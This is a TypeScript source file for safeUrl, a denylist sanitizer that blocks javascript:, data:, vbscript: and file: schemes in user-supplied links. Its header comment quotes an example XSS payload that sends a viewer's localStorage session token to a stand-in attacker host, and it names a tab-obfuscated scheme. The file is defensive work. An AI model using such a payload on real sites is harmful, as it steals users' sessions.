/**
 * safeUrl — DENYLIST sanitizer for user-supplied URLs (C-SEC-4 / M-SEC-1).
 *
 * Aspirants can save arbitrary strings as their social / meeting / maps links,
 * which voters then click. A value like
 *   javascript:fetch('https://attacker/?c='+localStorage.getItem('auth-storage'))
 * would execute when clicked (anchor href, window.location.href, window.open),
 * exfiltrating the viewer's session.
 *
 * Design choice: DENYLIST, not allowlist. We block only the script-capable
 * schemes and return every other URL **byte-for-byte unchanged**. This keeps
 * all legitimate links (https://, scheme-less "instagram.com/x", mailto:, tel:,
 * S3/CloudFront document URLs, google maps links) working exactly as before —
 * zero behaviour change for valid input, which is the whole point.
 *
 * Returns the original string if safe, or null if it carries a dangerous
 * scheme. Callers decide what to do with null (omit the link / fall back to #).
 */

// Schemes that can execute script or smuggle active content when navigated to.
const DANGEROUS_SCHEME = /^(javascript|data|vbscript|file):/i;

/**
 * Normalize a candidate URL for scheme inspection only. We strip leading
 * ASCII control chars + whitespace and remove embedded tab/newline/null that
 * browsers tolerate inside a scheme (e.g. "java\tscript:alert(1)"), so the
 * denylist can't be bypassed by obfuscation. NOTE: this normalized form is used
 * ONLY to decide safe/unsafe — the ORIGINAL string is what gets returned.
 */
const normalizeForCheck = (input: string): string =>
  input
    // strip leading control chars / whitespace (0x00-0x20) before the scheme
    .replace(/^[\x00-\x20]+/, '')
    // remove tabs / newlines / null that browsers ignore inside the scheme token
    .replace(/[\t\r\n\x00]/g, '')
    .toLowerCase();

export function safeUrl(input?: string | null): string | null {
  if (input == null) return null;
  if (typeof input !== 'string') return null;
  if (input.trim() === '') return null;

  const probe = normalizeForCheck(input);
  if (DANGEROUS_SCHEME.test(probe)) return null;

  // Safe — return the original, untouched, so valid links render identically.
  return input;
}

export default safeUrl;
